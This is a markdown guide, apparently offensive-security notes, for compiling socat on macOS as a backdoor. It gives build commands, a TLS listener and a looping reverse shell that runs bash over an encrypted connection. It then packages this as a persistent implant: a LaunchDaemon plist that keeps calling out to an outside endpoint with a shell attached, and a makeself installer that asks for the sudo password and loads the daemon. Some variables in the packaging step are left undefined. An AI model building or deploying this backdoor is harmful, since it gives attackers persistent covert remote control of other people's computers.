### Build socat for OSX
Build `socat` for OSX to be used as a backdoor.

Requirements:
- Openssl: `brew install openssl`

```shell
#Get sources and build
export PREFIX=/opt/backdoor
export BUILDDIR=/tmp/build

rm -rf ${BUILDDIR}
mkdir ${BUILDDIR}

cd ${BUILDDIR}
wget "https://www.openssl.org/source/openssl-1.0.2l.tar.gz"
wget "https://ftp.gnu.org/gnu/readline/readline-7.0.tar.gz"
wget "http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz"

tar -xf openssl-1.0.2l.tar.gz
tar -xf readline-7.0.tar.gz
tar -xf socat-1.7.3.2.tar.gz

cd openssl-1.0.2l
./Configure darwin64-x86_64-cc --prefix=${PREFIX}
make -j4
sudo make install
cd ${BUILDDIR}

cd readline-7.0
./configure --prefix=${PREFIX}
make -j4
sudo make install
cd ${BUILDDIR}

cd socat-1.7.3.2
export CPPFLAGS="-I/${BUILDDIR}/openssl-1.0.2l/ssl/ -I/${BUILDDIR}/openssl-1.0.2l/include -I/${BUILDDIR}/openssl-1.0.2l -I/${BUILDDIR}/readline-7.0"
export LIBS="-L${PREFIX}/lib"
./configure --prefix=${PREFIX}
make -j4
sudo make install
cd ${BUILDDIR}

#Initial Setup
#Enter through the openssl questions. If verify=1 => use correct commonName!
openssl req -new -x509 -days 100 -nodes -out /tmp/server.crt -keyout /tmp/server.key
cat /tmp/server.crt /tmp/server.key > /tmp/server.pem

#Listener
${PREFIX}/bin/socat openssl-listen:8181,forever,fork,reuseaddr,cert=/tmp/server.pem,verify=0 -

#Reverse Shell
while true; do ${PREFIX}/bin/socat openssl:localhost:8181,forever,interval=5,cafile=/tmp/server.crt,verify=0  exec:'bash -li',pty,stderr,sigint,sigquit,sane,setsid,ctty,echo=0; done
```

#### As a simple backdoor on OSX

Requirements: 
- makeself: `brew install makeself`

```shell
export ENDPOINT=1.2.3.4:443
export CERT=server.crt
export PKGCERTIFICATE=${TARGET}/${CERT}
export CERTIFICATE=${PREFIX}/${CERT}

rm -rf ${PACKAGE}
mkdir -p ${TARGET}

cp -r ${PREFIX} ${PACKAGE}
rm -rf ${TARGET}/include
rm -rf ${TARGET}/share
rm -rf ${TARGET}/ssl

cat > ${PACKAGE}/${PLIST}.plist <<EOF
<plist version="1.0">
        <dict>
                <key>Label</key>
                <string>${PLIST}</string>
                <key>ProgramArguments</key>
                <array>
                        <string>${PREFIX}/bin/socat</string>
                        <string>openssl:${ENDPOINT},forever,interval=5,cafile=${CERTIFICATE},verify=1</string>
                        <string>exec:'bash -li',pty,stderr,sigint,sigquit,sane,setsid,ctty,echo=0</string>
                </array>
                <key>KeepAlive</key>
                <true/>
        </dict>
</plist>
EOF

cat > ${PACKAGE}/setup.sh <<EOF
#!/bin/bash

echo "Please enter sudo password below"
sudo cp -r ${BASE} ${PREFIX}
sudo cp ${PLIST}.plist /Library/LaunchDaemons/
sudo launchctl load -w /Library/LaunchDaemons/${PLIST}.plist
EOF

cp /tmp/server.crt ${PKGCERTIFICATE}

makeself ${PACKAGE} /tmp/package.run bd.package /bin/bash setup.sh
```